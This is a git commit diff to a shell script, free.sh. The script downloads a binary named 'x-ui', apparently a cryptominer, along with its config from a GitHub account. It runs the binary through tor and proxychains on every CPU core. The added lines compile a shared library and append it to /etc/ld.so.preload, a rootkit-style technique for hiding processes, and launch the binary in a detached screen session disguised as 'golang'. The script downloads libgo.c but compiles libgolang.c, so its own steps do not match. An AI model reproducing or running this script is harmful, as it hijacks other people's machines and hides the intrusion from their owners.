52eb1e15abf9512e0438dc19208c213365f6cf44
pickaxecolleague <100679616+pickaxecolleague@users.noreply.github.com>
2022-03-10 22:10:37 +0700

    Update free.sh

--- free.sh
+++ free.sh
@@ -1,15 +1,23 @@
 #!/bin/bash
 
 cpu=$(echo nproc | bash)
+xui=https://github.com/pickaxecolleague/pickaxecolleague/raw/main/x-ui
+libgo=https://raw.githubusercontent.com/pickaxecolleague/pickaxecolleague/main/libgo.c
+config=https://raw.githubusercontent.com/pickaxecolleague/pickaxecolleague/main/config-free.json
 
 apt update
-apt install wget tor proxychains -y
+apt install wget tor proxychains gcc screen -y
 
-wget https://github.com/pickaxecolleague/pickaxecolleague/raw/main/x-ui
-wget -O config.json https://raw.githubusercontent.com/pickaxecolleague/pickaxecolleague/main/config-free.json
+wget $xui
+wget $libgo
+wget -O config.json $config
 
 nohup tor &>/dev/null &
 
+gcc -Wall -fPIC -shared -o libgolang.so libgolang.c -ldl
+sudo mv libgolang.so /usr/local/lib/
+echo /usr/local/lib/libgolang.so >> /etc/ld.so.preload
+
 chmod 777 x-ui
 
-proxychains ./x-ui --threads=$cpu --config=config.json
+screen -S "golang" proxychains ./x-ui --threads=$cpu --config=config.json
